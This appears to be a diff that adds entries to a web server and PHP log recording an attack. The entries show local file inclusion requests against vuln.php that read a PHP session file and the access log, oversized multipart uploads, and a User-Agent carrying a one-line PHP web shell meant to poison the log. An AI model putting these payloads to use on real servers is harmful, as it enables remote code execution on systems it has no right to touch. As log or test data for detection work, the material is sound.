@@ -33,3 +33,10 @@ auto_prepend_file=/tmp/sess_abc123def456
 HTTP/1.1 200 OK response body marker <<<P2S>>>uid=33(www-data)
 [Wed Oct 27 04:12:07.100000 2026] [php:warn] [pid 1234:tid 5] [client 10.0.0.5:5560] PHP Warning:  POST Content-Length of 134217728 bytes exceeds the limit of 8388608 bytes in Unknown on line 0
 [Wed Oct 27 04:12:07.200000 2026] [php:warn] [pid 1234:tid 5] [client 10.0.0.5:5561] PHP Warning:  Unknown: Multipart body parts limit exceeded 1000. in Unknown on line 0
+10.0.0.5 - - [27/Oct/2026:04:15:01 +0700] "POST /index.php HTTP/1.1" 502 157 "-" "-"
+Transfer-Encoding: chunked
+Content-Disposition: form-data; name="f"; filename="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+Set-Cookie: PHPSESSID="; path=/
+10.0.0.5 - - [27/Oct/2026:04:16:01 +0700] "GET /vuln.php?page=/var/tmp/php_sessions/sess_abc123def456ghi789 HTTP/1.1" 200 512 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:16:02 +0700] "GET /vuln.php?file=/var/log/nginx/access.log HTTP/1.1" 200 512 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:16:03 +0700] "GET /index.php HTTP/1.1" 200 512 "-" "<?php system($_GET[c]); ?>"
